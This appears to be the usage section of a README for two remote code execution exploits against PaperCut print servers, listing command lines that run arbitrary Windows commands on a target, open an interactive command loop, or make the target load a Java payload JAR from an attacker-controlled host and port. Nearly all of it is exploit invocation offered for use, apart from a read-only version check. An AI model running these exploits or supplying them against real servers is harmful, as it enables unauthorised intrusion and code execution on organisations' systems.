# pcut2026

### Windows command target
python3 papercut_external_lookup_rce.py 10.0.0.5 \
  --win-command 'whoami > C:\proof.txt'

### Java payload JAR (served over HTTP, loaded by the target)
python3 papercut_external_lookup_rce.py 192.168.1.10 \
  --jar payload.jar --lhost 192.168.1.100 --lport 8080

### Read-only version check only
python3 papercut_external_lookup_rce.py 192.168.1.10 --check -v

### HTTPS target with a self-signed cert (verification disabled by default)
python3 papercut_external_lookup_rce.py papercut.corp.local --ssl \
  --win-command 'whoami > C:\proof.txt'


# pcut2025

### Single command
python3 papercut_setupcompleted_rce.py -u http://192.168.1.100:9191 -c "cmd.exe /c whoami > C:\proof.txt"

### Default command (whoami)
python3 papercut_setupcompleted_rce.py -u https://papercut.company.com

### Interactive command loop
python3 papercut_setupcompleted_rce.py -u http://192.168.1.100:9191 -i

### Verbose with TLS (cert verification off by default)
python3 papercut_setupcompleted_rce.py -u https://papercut.target.com:9192 -v --verify -c "ipconfig /all"
